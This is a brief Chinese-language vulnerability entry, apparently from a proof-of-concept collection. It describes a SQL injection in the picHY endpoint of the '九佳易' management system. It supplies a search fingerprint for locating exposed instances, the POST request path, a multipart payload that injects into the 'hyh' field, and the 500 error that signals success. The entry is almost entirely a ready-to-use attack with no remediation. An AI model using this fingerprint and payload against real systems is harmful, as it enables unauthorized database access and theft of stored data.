# 九佳易管理系统picHY.ashxSQL存在注入漏洞

九佳易管理系统picHY.ashxSQL ｜ SQL注入 ｜ —
- **指纹**：`body="/XiTong/Index/W_IndexPbForm.win.js"`
- **请求**：`POST /HuiYuan/HuiYuanDangAn/picHY.aspx HTTP/1.1`

**Payload**
```
------WebKitFormBoundary
Content-Disposition: form-data; name="hyh"
'-1/user--
------WebKitFormBoundary--
```
- **响应特征**：500